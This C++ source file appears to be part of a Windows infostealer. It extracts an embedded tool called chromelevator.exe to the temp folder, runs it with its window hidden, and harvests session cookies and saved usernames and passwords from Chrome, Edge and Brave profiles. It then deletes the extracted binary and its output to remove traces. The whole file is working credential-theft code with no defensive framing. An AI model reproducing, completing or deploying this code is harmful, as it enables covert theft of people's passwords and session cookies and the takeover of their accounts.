#include "browser_data.h"
#include "resource.h"
#include "nlohmann/json.hpp"
#include <windows.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <utility>

namespace fs = std::filesystem;
using json = nlohmann::json;

// Extract embedded chromelevator.exe from resources to temp directory
static std::string extract_chromelevator() {
    // Get temp directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string extractPath = std::string(tempPath) + "cl_" + std::to_string(GetCurrentProcessId()) + ".exe";
    
    // Check if already extracted
    if (fs::exists(extractPath)) {
        return extractPath;
    }
    
    // Find the resource
    HRSRC hResource = FindResourceA(nullptr, MAKEINTRESOURCEA(IDR_CHROMELEVATOR), RT_RCDATA);
    if (!hResource) {
        throw std::runtime_error("Failed to find chromelevator resource");
    }
    
    // Load the resource
    HGLOBAL hGlobal = LoadResource(nullptr, hResource);
    if (!hGlobal) {
        throw std::runtime_error("Failed to load chromelevator resource");
    }
    
    // Get resource data
    void* pData = LockResource(hGlobal);
    DWORD dwSize = SizeofResource(nullptr, hResource);
    
    if (!pData || dwSize == 0) {
        throw std::runtime_error("Failed to access chromelevator resource data");
    }
    
    // Write to temp file
    std::ofstream outFile(extractPath, std::ios::binary);
    if (!outFile) {
        throw std::runtime_error("Failed to create temp file for chromelevator");
    }
    
    outFile.write(static_cast<const char*>(pData), dwSize);
    outFile.close();
    
    return extractPath;
}

std::pair<std::string, std::vector<SavedPassword>> extract_cookies_with_tool(const std::string& outputDir) {
    // Create output directory if it doesn't exist
    fs::create_directories(outputDir);

    std::string chromelevatorPath;
    
    // First try to extract from embedded resource
    try {
        chromelevatorPath = extract_chromelevator();
    } catch (const std::exception&) {
        // Fallback: try to find it on disk
        char exePath[MAX_PATH];
        GetModuleFileNameA(nullptr, exePath, MAX_PATH);
        std::string exeDir = fs::path(exePath).parent_path().string();
        
        std::vector<std::string> possiblePaths = {
            exeDir + "\\chromelevator\\chromelevator.exe",
            exeDir + "\\chromelevator.exe",
            "chromelevator\\chromelevator.exe",
            "chromelevator.exe"
        };
        
        for (const auto& path : possiblePaths) {
            if (fs::exists(path)) {
                chromelevatorPath = path;
                break;
            }
        }
    }

    // Check if chromelevator.exe exists
    if (chromelevatorPath.empty() || !fs::exists(chromelevatorPath)) {
        throw std::runtime_error("chromelevator.exe not found");
    }

    // Run chromelevator.exe with output directory
    std::string command = "\"" + chromelevatorPath + "\" -o \"" + outputDir + "\" -v";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window

    if (!CreateProcessA(nullptr, const_cast<char*>(command.c_str()),
                       nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        throw std::runtime_error("Failed to start chromelevator.exe: " + std::to_string(GetLastError()));
    }

    // Wait for the process to complete (with timeout)
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 120000); // 2 minute timeout
    if (waitResult != WAIT_OBJECT_0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        throw std::runtime_error("chromelevator.exe timed out or failed");
    }

    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clean up extracted exe
    try {
        if (chromelevatorPath.find("cl_") != std::string::npos) {
            fs::remove(chromelevatorPath);
        }
    } catch (...) {}

    if (exitCode != 0) {
        throw std::runtime_error("chromelevator.exe failed with exit code: " + std::to_string(exitCode));
    }

    // Now parse the output files
    std::vector<SavedPassword> allPasswords;
    std::string allCookiesJson = "[";

    bool firstCookie = true;
    std::vector<std::string> browsers = {"Chrome", "Edge", "Brave"};

    for (const auto& browser : browsers) {
        fs::path browserPath = fs::path(outputDir) / browser;
        if (!fs::exists(browserPath)) continue;

        for (const auto& entry : fs::directory_iterator(browserPath)) {
            if (!entry.is_directory()) continue;

            std::string profile = entry.path().filename().string();

            // Parse cookies
            fs::path cookiesFile = entry.path() / "cookies.json";
            if (fs::exists(cookiesFile)) {
                try {
                    std::ifstream file(cookiesFile);
                    std::string content((std::istreambuf_iterator<char>(file)),
                                     std::istreambuf_iterator<char>());

                    // Find the JSON array content
                    size_t startPos = content.find("[\n  {");
                    if (startPos == std::string::npos) {
                        startPos = content.find("[\r\n  {");
                    }
                    if (startPos == std::string::npos) {
                        startPos = content.find('[');
                    }

                    if (startPos != std::string::npos) {
                        size_t endPos = content.rfind(']');
                        if (endPos != std::string::npos && endPos > startPos) {
                            std::string jsonContent = content.substr(startPos, endPos - startPos + 1);

                            // Parse and add browser/profile info to each cookie
                            json cookiesJson = json::parse(jsonContent);
                            for (auto& cookie : cookiesJson) {
                                cookie["browser"] = browser;
                                cookie["profile"] = profile;

                                if (!firstCookie) allCookiesJson += ",";
                                allCookiesJson += cookie.dump();
                                firstCookie = false;
                            }
                        }
                    }
                } catch (const std::exception&) {
                    // Skip malformed files
                }
            }

            // Parse passwords
            fs::path passwordsFile = entry.path() / "passwords.json";
            if (fs::exists(passwordsFile)) {
                try {
                    std::ifstream file(passwordsFile);
                    std::string content((std::istreambuf_iterator<char>(file)),
                                     std::istreambuf_iterator<char>());

                    // Find the JSON array content
                    size_t startPos = content.find("[\n  {");
                    if (startPos == std::string::npos) {
                        startPos = content.find("[\r\n  {");
                    }
                    if (startPos == std::string::npos) {
                        startPos = content.find('[');
                    }

                    if (startPos != std::string::npos) {
                        size_t endPos = content.rfind(']');
                        if (endPos != std::string::npos && endPos > startPos) {
                            std::string jsonContent = content.substr(startPos, endPos - startPos + 1);
                            json passwordsJson = json::parse(jsonContent);

                            for (const auto& pwd : passwordsJson) {
                                std::string origin = pwd.value("origin", "");
                                std::string username = pwd.value("username", "");
                                std::string password = pwd.value("password", "");

                                // Only add if data is meaningful
                                if (!origin.empty() && origin != "N/A" &&
                                    !username.empty() && username != "N/A" &&
                                    !password.empty() && password != "N/A") {
                                    allPasswords.push_back({
                                        origin, username, password
                                    });
                                }
                            }
                        }
                    }
                } catch (const std::exception&) {
                    // Skip malformed files
                }
            }
        }
    }

    allCookiesJson += "]";

    // Clean up output directory
    try {
        fs::remove_all(outputDir);
    } catch (...) {
        // Ignore cleanup errors
    }

    return {allCookiesJson, allPasswords};
}
